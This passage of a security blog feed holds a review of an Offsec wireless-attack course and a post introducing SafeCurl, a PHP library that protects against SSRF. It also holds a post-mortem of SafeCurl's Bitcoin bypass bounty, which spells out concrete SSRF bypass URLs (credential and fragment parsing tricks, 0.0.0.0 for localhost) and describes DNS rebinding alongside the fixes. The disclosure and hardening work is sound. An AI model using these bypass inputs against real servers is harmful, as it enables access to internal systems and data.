&lt;p&gt;Quick run down, they compare: interface, signal/power, antennas &amp;amp; chipsets. I personally was impressed with the antennas section, showing the different signal patterns – this is something I hadn't looked into before.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I should say at this point, unlike PWB &amp;amp; CTP where you remotely VPN in, connecting to their (Offsec) labs, you need to setup and create your own locally. So, if you wish to do any of the practical you will need to purchase some of the hardware you have just researched (as its not included in the course fees). The exam however, is taken online – this is covered later.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Next, the course starts to teach you about how the hardware works with the software via wireless stack &amp;amp; drivers, which is another commonly asked about area I've seen online. They run you through the basics such as testing drivers &amp;amp; (manually) enabling "monitor" mode.&lt;/p&gt;

&lt;p&gt;I would have liked to have seen more "troubleshooting" here, or a bit more advance commands to gather more information about what's going on/current setup. I mention this because it bugs me regarding people who are wanting help, but lacking detail&lt;em&gt; (however more often than not, it's also the manner of the person and how they are asking for help)&lt;/em&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The rest of the course from here on out it is now practical &lt;em&gt;(note: I'm guessing a lot of people's pre-course knowledge starts at this point)&lt;/em&gt;. Most of the time, it uses the aircrack-ng suite, which is really a swift army knife. By the end of the course, I think you use all the attacks but one that aireplay-ng has to offer. There is some similarity to the aircrack-ng's wiki content for parts of the remainder of the course.&lt;/p&gt;

&lt;p&gt;The course explains what is being shown on screen, with how it relates to what's been taught so far, followed by arguments to interface with the program as you see fit. At the end of each chapter, there is now a lab to complete. These are tasks that relate to what has just been taught as well as a troubleshooting for common issues that the student may run into at certain stages.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;They start at the start with the aircrack-ng suite, by putting your card into the right mode, as this is something that you will always need to do before commencing any attacks. This allows you to view the surrounding wireless networks. The last bit in this section, tests the wireless card, making sure "packet injection" works.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;It then branches off into WEP attacks, with client and clientless scenarios using various different configurations &amp;amp; attacks. Depending on which access point has been used, will affect which attacks are successful. Offsec does recommend certain access points to be used, and the course has been fully tested with them (meaning all the attacks will work). If you wish to break away and use something different, you may find that certain attacks will not work.&lt;/p&gt;

&lt;p&gt;As there are various possibilities and different combinations of WEP configurations, not every scenario is "hackable" (e.g. clientless with WEP Shared Key), however the ones that are, are covered. It even mentions the injection attack, which allows you to inject data into a network which you are not even "connected" to.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Then the course sets its focus on WPA/WPA2. Unfortunately the course only covers on Pre-Shared Key (PSK), skipping over Enterprise. However, most WiFi networks that I've seen use PSK.&lt;/p&gt;

&lt;p&gt;I've gone through the pain &amp;amp; "joy" of setting up a radius server at home in a test lab, which isn't the most straightforward thing – which could be another reason why its not covered. I also understand not giving away a pre-done VM image, as that still has a lot of moving parts and could cause another set of issues.&lt;/p&gt;

&lt;p&gt;They course cover using CPU vs GPU with the speed increase between the two methods, as well using pre-calculated rainbow tables to speed up the brute force progress.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Afterwards it's the reconnaissance section which demonstrates a few different methods to visualize clients and their relationships using 802.11, something which I can see being very useful when doing wireless assignments for clients. There is also a bit of information on "war * (war driving/walking/cycling etc)" – which is something that I spent a lot of time doing in 2013 (blog post to follow).&lt;/p&gt;

&lt;p&gt;Lastly, there is the "rogue access point" (aka a fake access point or the "evil twin attack") for both WEP &amp;amp; WPA. This is where you setup a "cloned" access point to mimic the target, and finding different ways to force targets to use it. The last practical for the course goes into "Karmetasploit" to exploit the wireless client, which I felt is a good way to finish.&lt;/p&gt;

&lt;p&gt;Up to this point, the videos coincide with the handbook/document very well, much like with PWB. There are a few extra "bonus" things that are included in the PDF (alternate methods and techniques to speed up the attacks). There was a few extra little "tricks" that you can do also do, covering sharing the wireless interface over a network to a remote machine, relaying &amp;amp; repeating captured data and decrypting packets.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;For all of this, true Offsec style, you learn how to do this "manually". You don't rely on any "One click GUI" programs (that really is just a wrapper around aircrack-ng suite).&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Side note: If you have done PWB/CTP, you will notice it's not the same narrator (Mati), this time it's Devon.&lt;/em&gt;&lt;/p&gt;

&lt;a name="Exam..OSWP."&gt;&lt;/a&gt;
&lt;h3&gt;Exam (OSWP)&lt;/h3&gt;

&lt;p&gt;I can't go into too much detail here without giving the game away. In short, there isn't any "curve balls" in it (unlike OSCP/OSCE), its straight forward and pretty much what you would expect.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The exam is four hours long, but I found myself finished within an hour.&lt;/p&gt;

&lt;p&gt;It would have been sooner, however there was a technical issue on the remote machine (the wireless card needed to be switched out). All I had to do was ask on IRC and an admin had fixed it within 15 minutes.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Like OSCP/OSCE, everything that you're tested on, is covered in the course material. Unlike OSCP/OSCE, you don't need to write a report at the end, in order to pass.&lt;/p&gt;

&lt;p&gt;&lt;img class="center" src="https://blog.g0tmi1k.com/images/offsec-oswp.png" title="Offec OSWP" /&gt;&lt;/p&gt;

&lt;a name="Reflection"&gt;&lt;/a&gt;
&lt;h2&gt;Reflection&lt;/h2&gt;

&lt;a name="Myths"&gt;&lt;/a&gt;
&lt;h3&gt;Myths&lt;/h3&gt;

&lt;p&gt;One of the comments I've heard, criticising the course is, "It's mainly WEP attacks".&lt;/p&gt;

&lt;p&gt;This is true to a point as the WEP section has about 100 pages &amp;amp; WPA/WPA2 is about 40 pages. My take on it is that there aren't as many (publicly known) attacks towards WPA/WPA2, so there isn't as much information to cover.&lt;/p&gt;

&lt;p&gt;Because WPA/WPA2 uses (a much) "better" cipher, the only (known) weakness is just an offline brute force on the four way handshake .Whereas with WEP there was a poor cipher implement which had a weakness with the maths that behind it. The result means there are various ways to crack WEP.&lt;/p&gt;

&lt;a name="WPS"&gt;&lt;/a&gt;
&lt;h3&gt;WPS&lt;/h3&gt;

&lt;p&gt;To help "pad out" the WPA/WPA2 section, I thought they could have covered the WPS attack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note: WPS != WPA/WPA2.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However you can only have it on WPA/WPA2 networks, which I believe makes it relevant. Looking into the history of it, I understand why it's not in the course...&lt;/p&gt;

&lt;p&gt;The course is currently on &lt;a href="http://www.offensive-security.com/offsec/offensive-security-wireless-attacks-updated/"&gt;version 3&lt;/a&gt;, which came out in July 2011. However, about four months later, in December 2011, (as far as I can see) there was the first public release of a PoC "tool" (and &lt;a href="http://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/"&gt;paper&lt;/a&gt;) to "hack" WPS. It's a bit of a shame with the timing as it didn't make it into this release of the course (may do if there is a newer release of the course.)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Whilst on the subject: shortly after the release of the tool which most people know today, &lt;a href="https://code.google.com/p/reaver-wps/downloads/list"&gt;reaver&lt;/a&gt;, but that hasn't been updated since January 2012 (last version is v1.4). To pick up the slack/fill in for it, there is "&lt;a href="https://github.com/bdpurcell/bully"&gt;bully&lt;/a&gt;" which is currently still in active development.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Side note: the WPS attack hasn't (yet?) made it into aircrack-ng.&lt;/em&gt;&lt;/p&gt;

&lt;a name="Criticism"&gt;&lt;/a&gt;
&lt;h3&gt;Criticism&lt;/h3&gt;

&lt;p&gt;Personally, I would have liked to have seen something more than a line or two about both "hidden" SSIDs &amp;amp; MAC filtering. These are bypass-able, and could have an "extra mile" exercise (like in PWB).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;As I mentioned before, in the WPA/WPA2 section, the course doesn't cover enterprise. With WEP, there isn't any mention of "key index" (how to identify which key index is being used). However, "most" of the time, it is slot 1.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Side note: if it's not index 1, then Apple devices have a hard time connecting!&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I felt there isn't as much of a "self-study" element, compared to the PWB, as the course material does cover a vast amount of what you need to know as and as a result, limits the possible "extra mile" exercises.&lt;/p&gt;

&lt;a name="Is.this.course.for.me."&gt;&lt;/a&gt;
&lt;h2&gt;Is this course for me?&lt;/h2&gt;

&lt;a name="So.why.do.this.course..What.s.the.point.in.doing.this..I.know.how.to.crack.hack.WPA."&gt;&lt;/a&gt;
&lt;h3&gt;So why do this course? What's the point in doing this, I know how to crack/hack WPA.&lt;/h3&gt;

&lt;p&gt;You may think that you know it all, and you truly might do. However, for the people that don't, or those who are missing certain areas, this is a great way to learn about wireless 802.11 security. It certainly helped me to fill in the blanks &amp;amp; pitfalls in my knowledge and cleaned up a few things.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The course itself isn't too complex and it's short (and this is reflected in the course fees. It is also currently the cheapest course that Offsec's cheapest course on offer).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;There is also an exam at the end, which will give you a certificate (OSWP), which is recognized professionally.&lt;/p&gt;

&lt;a name="What.s.wrong.with.the.resources.that.are.out.there.currently."&gt;&lt;/a&gt;
&lt;h3&gt;What's wrong with the resources that are out there currently?&lt;/h3&gt;

&lt;p&gt;Nothing! If they work for you, that's great.&lt;/p&gt;

&lt;p&gt;Personally, I like the mixture of both written material &amp;amp; multimedia (that co-inside with each other). I personally really like Offsec's style of presenting &amp;amp; teaching.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The aircrack-ng wiki is a manual showing how to use their tool &lt;em&gt;(rightly so!)&lt;/em&gt;, and SecurityTube is a free "sample" of their commercial course (the videos are free, however everything else requires a fee – slides, certificate and additional content).&lt;/p&gt;

&lt;p&gt;From what I saw from Security Tube, it might touch on more topics, however, I didn't feel that it went into the same amount of depth and I didn't like the style in which it was presented.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Kudos to both, for giving out free, descent and original content.&lt;/p&gt;

&lt;a name="Summary"&gt;&lt;/a&gt;
&lt;h2&gt;Summary&lt;/h2&gt;

&lt;a name="Advice"&gt;&lt;/a&gt;
&lt;h3&gt;Advice&lt;/h3&gt;

&lt;p&gt;There is a chance that you will need to buy some hardware for the course, so don't expect or rely on your current wireless device.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;If something isn't working for you, try and troubleshoot why its not. It (wireless security) is a popular subject online, and the chances are, someone before you has already had the issue (and found the solution).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;You do not need to have done any of the other Offsec courses (e.g. PWB/CTP) before, that's not an issue. There isn't any "cross over" between the courses.
This could be your first (security) certificate, or simply just another course for you to do.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Offsec once again, starts at the start, and covers everything in a single package - including the stuff that you could have been afraid to ask.&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I wanted to learn about wireless 802.11 security, not how to hack WEP/WPA and I feel they managed to give me exactly what I wanted.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Credit to Offsec, as it is obvious that there has been a fair amount of time and thought put into the course (as always!). Thank you for doing so.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This is an enjoyable little straightforward course and I would recommend it.&lt;/strong&gt;&lt;/p&gt;</description><pubDate>Fri, 24 Jan 2014 19:54:00 +0000</pubDate></item><item><title>SafeCurl: SSRF Protection, and a "Capture the Bitcoins"</title><link>https://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/</link><description>&lt;p&gt;Server-Side Request Forgery attacks involve getting a target server to perform requests on our behalf. Rather than covering some &lt;a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit"&gt;great&lt;/a&gt; &lt;a href="http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-1.html"&gt;material&lt;/a&gt; already published, this post will be to introduce a new PHP package designed to help prevent these sort of attacks.&lt;/p&gt;

&lt;h3 id="protections"&gt;Protections&lt;/h3&gt;

&lt;p&gt;To protect our scripts from being abused in this way, we simply validate any URL or file path being passed to functions which can send requests. Of course, this is easier said than done.&lt;/p&gt;

&lt;p&gt;The first step is to validate the provided scheme (and port if specified). This is to stop requests to PHP’s extra protocols (&lt;code&gt;php://&lt;/code&gt;, &lt;code&gt;phar://&lt;/code&gt;) which would let an attacker read files off of the file system.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/ssrf/ssrf-1.png"&gt;
        &lt;img src="https://whitton.io/images/ssrf/ssrf-1.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;The second is to validate the URL itself. This is to make sure that someone isn’t requested a blacklisted domain (such as &lt;code&gt;&lt;a href="https://jira.fin1te.net"&gt;https://jira.fin1te.net&lt;/a&gt;&lt;/code&gt;), or a private/loopback IP (such as &lt;code&gt;127.0.0.1&lt;/code&gt;). You should also resolve any domain names to their IP addresses, and validate these to make sure someone doesn’t use a DNS entry pointing to an invalid IP.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/ssrf/ssrf-2.png"&gt;
        &lt;img src="https://whitton.io/images/ssrf/ssrf-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Lastly, any redirects which cURL would normally handle should be caught, and the URL specified in the &lt;code&gt;Location&lt;/code&gt; header validated using the above steps.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/ssrf/ssrf-3.png"&gt;
        &lt;img src="https://whitton.io/images/ssrf/ssrf-3.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Putting this all together, we get &lt;a href="https://github.com/fin1te/safecurl"&gt;SafeCurl&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id="safecurl"&gt;SafeCurl&lt;/h3&gt;

&lt;p&gt;SafeCurl has been designed to be a drop in replacement for the &lt;a href="http://php.net/manual/en/function.curl-exec.php"&gt;&lt;code&gt;curl_exec&lt;/code&gt;&lt;/a&gt; function in PHP. Whilst there are other functions in PHP which can be used to grab the contents of a URL (&lt;code&gt;file_get_contents&lt;/code&gt;, &lt;code&gt;fopen&lt;/code&gt;, &lt;code&gt;include&lt;/code&gt;), &lt;code&gt;curl_exec&lt;/code&gt; is the most popular. In future versions, support for other functions will be added.&lt;/p&gt;

&lt;p&gt;To use SafeCurl, simply call the &lt;a href="https://github.com/fin1te/safecurl/blob/master/src/fin1te/SafeCurl/SafeCurl.php#L107"&gt;&lt;code&gt;SafeCurl::execute&lt;/code&gt;&lt;/a&gt; method where you’d usually call &lt;code&gt;curl_exec&lt;/code&gt;, wrapping everything in a &lt;code&gt;try/catch&lt;/code&gt; block.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/ssrf/ssrf-4.png"&gt;
        &lt;img src="https://whitton.io/images/ssrf/ssrf-4.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;By default, SafeCurl will only allow HTTP or HTTPS requests, to ports 80, 443 and 8080, which don’t resolve to a private/loopback IP address.&lt;/p&gt;

&lt;p&gt;If you wish to specify additional options, instantiate a new &lt;a href="https://github.com/fin1te/safecurl/blob/master/src/fin1te/SafeCurl/Options.php"&gt;&lt;code&gt;Options&lt;/code&gt;&lt;/a&gt; object and pass in your custom rules. Domains are accepted in regular expression format, and IPs in &lt;a href="https://en.wikipedia.org/wiki/Cidr"&gt;CIDR notation&lt;/a&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/ssrf/ssrf-5.png"&gt;
        &lt;img src="https://whitton.io/images/ssrf/ssrf-5.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;More usage information is available on the &lt;a href="https://github.com/fin1te/safecurl"&gt;Github project&lt;/a&gt;. If you find any issues please &lt;a href="https://github.com/fin1te/safecurl/issues/new"&gt;raise them&lt;/a&gt;, or better yet, submit a pull request.&lt;/p&gt;

&lt;p&gt;If you manage to find a way of bypassing it completely, then please participate in the bounty.&lt;/p&gt;

&lt;h4 id="bounty-capture-the-bitcoins"&gt;Bounty (Capture the Bitcoins)&lt;/h4&gt;

&lt;p&gt;In order to give SafeCurl a real-world test, I’ve hosted a &lt;a href="http://safecurl.fin1te.net"&gt;demo site&lt;/a&gt;, which lets you try out the different protections.&lt;/p&gt;

&lt;p&gt;The document root contains a &lt;a href="http://safecurl.fin1te.net/btc.txt"&gt;Bitcoin private key&lt;/a&gt;, with 0.25BTC contained within. This file is only accessible from localhost, so if you do bypass it, grab the file and the Bitcoins are yours.&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://github.com/fin1te/safecurl.fin1te.net"&gt;source code&lt;/a&gt; for the site is also available, if you’re interested.&lt;/p&gt;

&lt;p&gt;For more information see the &lt;a href="http://safecurl.fin1te.net/#bounty"&gt;Bounty page&lt;/a&gt;.&lt;/p&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/"&gt;SafeCurl: SSRF Protection, and a "Capture the Bitcoins"&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on May 19, 2014.&lt;/p&gt;</description><pubDate>Sun, 18 May 2014 23:00:00 +0000</pubDate></item><item><title>SafeCurl "Capture the Bitcoins" Post-Mortem</title><link>https://whitton.io/articles/safecurl-capture-the-bitcoins-post-mortem/</link><description>&lt;p&gt;It’s been a week since I launched the &lt;a href="http://safecurl.fin1te.net"&gt;SafeCurl “Capture the Bitcoins”&lt;/a&gt; contest, which has been a fun, but humbling event.&lt;/p&gt;

&lt;p&gt;Whilst I work as Security Engineer, and submitted my first bug bounty entry two years ago, I come from a development background. I’ve been writing PHP coming up to nine years now, though nothing much in production for the past year and a half.&lt;/p&gt;

&lt;p&gt;I wanted to take a break from searching for bugs, so decided to write some PHP (the language I surprisingly love). &lt;a href="https://github.com/fin1te/safecurl"&gt;SafeCurl&lt;/a&gt; seemed like a great starting point - a useful package, not too large, and still involving web app security.&lt;/p&gt;

&lt;p&gt;Once written, I launched the bounty. Primarilly to give it a thorough test, and partly because I wanted to see what it would be like &lt;em&gt;receiving&lt;/em&gt; bug reports rathering than submitting them.&lt;/p&gt;

&lt;p&gt;In my head, I’d assumed that it would take &lt;em&gt;ages&lt;/em&gt; for someone to bypass my code (if it happened at all). In reality, it took &lt;strong&gt;2 hours&lt;/strong&gt;. The reason being that I had rushed the project, excited to get it released as soon as possible. Further investigation should have been done at the start, which would have stopped such a silly bypass being possible.&lt;/p&gt;

&lt;p&gt;Initially, there was going to be one 0.25B⃦ bounty. However, if the prize was won before most people had seen the site, there’s less incentive to keep looking. So I re-filled the wallet, and assumed this time no one would find a bypass.&lt;/p&gt;

&lt;p&gt;I paid out another 0.1B⃦ to two people suggesting a &lt;a href="https://en.wikipedia.org/wiki/Dns_rebinding"&gt;DNS rebinding&lt;/a&gt; attack may be possible. Whilst this was just a theory, I created a hot-fix to pin DNS in cURL.&lt;/p&gt;

&lt;p&gt;Then, three more 0.25B⃦ bounties caused by inconsistencies in PHP’s URL parsing and the &lt;code&gt;&lt;a href="http://uk3.php.net/curl_exec"&gt;curl_exec&lt;/a&gt;&lt;/code&gt; function. After the first two were paid out, I declared the bounty over. However, the third was so similar to the previous two, it was only fair to pay out (from my personal wallet).&lt;/p&gt;

&lt;p&gt;I’ve rewarded an additional 0.95B⃦ than I’d planned, and I don’t have infinite Bitcoins, but it was worth the money.&lt;/p&gt;

&lt;h3 id="bypasses"&gt;Bypasses&lt;/h3&gt;

&lt;p&gt;As I mentioned above, this was a stupid mistake. In the code, I’d blacklisted certain private ranges (&lt;code&gt;127.0.0.1/32&lt;/code&gt;, &lt;code&gt;10.0.0.0/8&lt;/code&gt;, &lt;code&gt;172.16.0.0/12&lt;/code&gt;, &lt;code&gt;192.168.0.0/16&lt;/code&gt;), but &lt;code&gt;0.0.0.0&lt;/code&gt; could also be used to refer to localhost.&lt;/p&gt;

&lt;p&gt;The solution was pretty simple - blacklist &lt;strong&gt;any&lt;/strong&gt; reserved ranges.&lt;/p&gt;

&lt;p&gt;Found by &lt;a href="https://twitter.com/zoczus"&gt;@zoczus&lt;/a&gt;.&lt;/p&gt;

&lt;h5 id="dns-rebinding"&gt;DNS Rebinding&lt;/h5&gt;
&lt;p&gt;I was made aware that my code wasn’t safe from a DNS rebinding attack. This would involve rapidly switching the A record for the domain name from a valid IP (which passes any checks), to an internal IP. Whilst this is theoretical, I’ve played around with it but couldn’t get it to exploit, it was 1am and didn’t want to risk it whilst I was asleep.&lt;/p&gt;

&lt;p&gt;Two separate people raised it at the same time. Whilst I could have just paid the first, I thought it’d be fair to pay both since they came up with it independently (the Facebook attitude).&lt;/p&gt;

&lt;p&gt;For this, the IP returned from &lt;code&gt;&lt;a href="http://uk3.php.net/gethostbynamel"&gt;gethostbynamel&lt;/a&gt;&lt;/code&gt; is pinned by replacing the hostname in the URL with the IP, then passing the original hostname in the HTTP “Host” header.&lt;/p&gt;

&lt;p&gt;Found by &lt;a href="https://twitter.com/47696d6569"&gt;@47696d6569&lt;/a&gt; and &lt;a href="http://rya.nc/"&gt;rynac&lt;/a&gt;.&lt;/p&gt;

&lt;h5 id="url-parsing-issue-1"&gt;URL parsing issue #1&lt;/h5&gt;
&lt;p&gt;This was an interesting one. Whilst the &lt;code&gt;btc.txt&lt;/code&gt; file couldn’t be accessed, it did bypass all other checks of SafeCurl so was worthy of the bounty.
Passing &lt;code&gt;http://user:pass@safecurl.fin1te.net?@google.com&lt;/code&gt; to &lt;code&gt;&lt;a href="http://uk3.php.net/parse_url"&gt;parse_url&lt;/a&gt;&lt;/code&gt; causes &lt;code&gt;google.com&lt;/code&gt; to be returned (PHP sees &lt;code&gt;pass@safecurl.fin1te.net?&lt;/code&gt; as the password). However, when the full URL is given to &lt;code&gt;&lt;a href="http://uk3.php.net/curl_exec"&gt;curl_exec&lt;/a&gt;&lt;/code&gt;, it sees &lt;code&gt;safecurl.fin1te.net&lt;/code&gt; as the host, and &lt;code&gt;@google.com/&lt;/code&gt; as the query string. Pretty cool trick.&lt;/p&gt;

&lt;p&gt;A quick solution for this was to disable the use of credentials in the URL. This worked, until the next bypass was found.&lt;/p&gt;

&lt;p&gt;Found by &lt;a href="https://twitter.com/shDaniell"&gt;@shDaniell&lt;/a&gt;.&lt;/p&gt;

&lt;h5 id="url-parsing-issue-2"&gt;URL parsing issue #2&lt;/h5&gt;
&lt;p&gt;Similar to the previous, passing &lt;code&gt;&lt;a href="http://validurl.com"&gt;http://validurl.com&lt;/a&gt;#user:pass@safecurl.fin1te.net&lt;/code&gt; causes &lt;code&gt;&lt;a href="http://uk3.php.net/parse_url"&gt;parse_url&lt;/a&gt;&lt;/code&gt; to see &lt;code&gt;validurl.com&lt;/code&gt; as the host, and &lt;code&gt;user:pass@safecurl.fin1te.net&lt;/code&gt; as the fragment. Like before, &lt;code&gt;&lt;a href="http://uk3.php.net/curl_exec"&gt;curl_exec&lt;/a&gt;&lt;/code&gt; handles this differently and uses &lt;code&gt;safecurl.fin1te.net&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This was patched by using &lt;code&gt;rawurlencode&lt;/code&gt; on the username, password and fragment to prevent the URL getting parsed differently.&lt;/p&gt;

&lt;p&gt;Found by Marcus T.&lt;/p&gt;

&lt;h5 id="url-parsing-issue-3"&gt;URL parsing issue #3&lt;/h5&gt;
&lt;p&gt;And the last one was again very similar. I didn’t URL encoded the query string, so &lt;code&gt;&lt;a href="http://google.com"&gt;http://google.com&lt;/a&gt;?user:pass@safecurl.fin1te.net&lt;/code&gt; was used to bypass the check.&lt;/p&gt;

&lt;p&gt;The path and query string are now URL encoded too, with certain characters (&lt;code&gt;&amp;amp; = ; [ ]&lt;/code&gt;) left intact, else the receiving may not parse it properly.&lt;/p&gt;

&lt;p&gt;Found by &lt;a href="https://twitter.com/iDeniSix"&gt;@iDeniSix&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id="lessons-learnt"&gt;Lessons Learnt&lt;/h4&gt;

&lt;h5 id="lesson-1---dont-rush"&gt;Lesson #1 - Don’t Rush&lt;/h5&gt;
&lt;p&gt;The first issue, along with typos, were caused by me rushing the project. These could have been prevented by taking it a bit slower, and by doing a proper design and investigation phase before starting development.&lt;/p&gt;

&lt;h5 id="lesson-2---bug-bounties-are-a-great-idea"&gt;Lesson #2 - Bug Bounties are a Great Idea&lt;/h5&gt;
&lt;p&gt;Had I launched my code straight into production, without having ~1,000,000 attempts to bypass it, would have meant that the issues above would not have been fixed, thus causing vulnerable code to be deployed.&lt;/p&gt;

&lt;p&gt;There is a price to pay, namely the Bitcoins I paid out, but this is nothing compared to the cost of someone using it for malicious purposes.&lt;/p&gt;

&lt;h5 id="lesson-3---have-unit-tests-get-code-reviews"&gt;Lesson #3 - Have Unit Tests, Get Code Reviews&lt;/h5&gt;
&lt;p&gt;This is something I’ve learnt from development in “real-life”. Unfortunately I didn’t apply this to my own project (partly because it was just me working on it, partly because of Lesson #1). Unit tests do seem a bit of a chore to write sometimes, but they can catch a lot of bugs being re-introduced in the codebase. Plus having someone look over your code from a different perspective is invaluable.&lt;/p&gt;

&lt;h5 id="lesson-4---youre-not-as-good-as-you-think"&gt;Lesson #4 - You’re Not as Good as You Think&lt;/h5&gt;
&lt;p&gt;This may sound like a horrible lesson, but it’s not. Having something “secure” you wrote be ripped to shreds is a &lt;em&gt;really&lt;/em&gt; awesome thing. It makes you realise that there may be gaps in your knowledge, and you now know where they are, and how to fix them. I’m really excited to launch another for this exact reason.&lt;/p&gt;

&lt;h4 id="going-forward"&gt;Going Forward&lt;/h4&gt;
&lt;p&gt;SafeCurl version 2 will be released shortly. This will include real unit tests covering the code, and test cases for each of the bypasses (and any other techniques I can find). Plus, experimental IPv6 support will be added.&lt;/p&gt;

&lt;p&gt;Another bounty will be launched at some point. Whether it’s a SafeCurl bounty, or another concept, I’ve not decided.&lt;/p&gt;

&lt;p&gt;I will also be looking to port SafeCurl to other languages such as Java, Python, Ruby, etc. This will be more of a challenge, since my strongest skills lie with PHP. If anyone wants to help out drop me a message.&lt;/p&gt;

&lt;h4 id="statistics"&gt;Statistics&lt;/h4&gt;
&lt;p&gt;A great part of the event was looking inside the Apache access logs to see some of the attempts people were making. I’ve included statistics, if you’re curious.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Total attempts&lt;/strong&gt; 1,140,803&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Average attempts per person&lt;/strong&gt; 651&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Average attempts per person (Excluding top 10)&lt;/strong&gt; 20&lt;/p&gt;


    &lt;p&gt;&lt;a href="https://whitton.io/articles/safecurl-capture-the-bitcoins-post-mortem/"&gt;SafeCurl "Capture the Bitcoins" Post-Mortem&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on May 26, 2014.&lt;/p&gt;</description><pubDate>Sun, 25 May 2014 23:00:00 +0000</pubDate></item><item><title>Bug Bounties 101 - Getting Started</title><link>https://whitton.io/articles/bug-bounties-101-getting-started/</link><description>&lt;p&gt;Occasionally I’ll get an email from someone interested in getting involved in bug bounties. Whilst some people are quite protective about giving out information - nervous that having more people participating leaves less bugs, I believe that the more people involved the better. Getting paid for issues and gaining credibility is great, but the end goal should be to improve web security as a whole.&lt;/p&gt;

&lt;p&gt;I thought it’d be useful to compile some of the information I give out (as opposed to typing it out each time), and some tips for people starting out. If you have anything to add, shoot me a message and I’ll update this page.&lt;/p&gt;

&lt;p&gt;For anyone already working in web application security this is probably a bit too beginner for you.&lt;/p&gt;

&lt;h4 id="bug-bounties"&gt;Bug Bounties&lt;/h4&gt;
&lt;p&gt;Bug bounties, also known as responsible disclosure programmes, are setup by companies to encourage people to report potential issues discovered on their sites. Some companies chose to reward a researcher with money, swag, or an entry in their hall-of-fame. If you’re interested in web application security then they’re a great way of honing your skills, with the potential of earning some money and/or credibility at the same time.&lt;/p&gt;

&lt;h4 id="required-reading"&gt;Required Reading&lt;/h4&gt;
&lt;p&gt;There is one book that everyone recommends, and rightly so - &lt;a href="http://www.amazon.co.uk/The-Web-Application-Hackers-Handbook/dp/1118026470"&gt;The Web Application Hackers Handbook&lt;/a&gt;, which covers the majority of common web bugs, plus it uses Burp Suite in the examples.&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"&gt;OWASP Top Ten&lt;/a&gt; has a high-level overview of the most common web application bugs.&lt;/p&gt;

&lt;h4 id="blogs"&gt;Blogs&lt;/h4&gt;
&lt;p&gt;Quite a few people, me included, blog about issues they find. This is a great insight into the type of bugs that exist on sites, plus they’re always an interesting read. These are the ones I can remember off the top of my head.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href="http://www.breaksec.com/?page_id=6002"&gt;Nir Goldshlager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://homakov.blogspot.co.uk/"&gt;Egor Homakov&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://bitquark.co.uk/blog/"&gt;Bitquark&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://nealpoole.com/blog/"&gt;Neal Poole&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://nahamsec.com/"&gt;Behrouz Sadeghipour&lt;/a&gt;&lt;/li&gt;
